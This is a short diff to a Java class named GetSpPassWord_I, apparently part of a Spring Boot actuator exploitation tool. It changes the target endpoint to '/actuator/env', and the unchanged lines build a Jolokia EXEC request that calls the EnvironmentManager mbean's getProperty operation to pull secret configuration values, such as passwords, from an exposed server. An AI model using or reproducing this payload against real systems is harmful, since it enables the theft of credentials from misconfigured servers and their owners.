@@ -268,7 +268,7 @@ public class GetSpPassWord_I {
         String api = "/actuator/jolokia";
         String llib = "jolokia-core";
         String site = address + api;
-        String pocsite = address + "/env";
+        String pocsite = address + "/actuator/env";
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
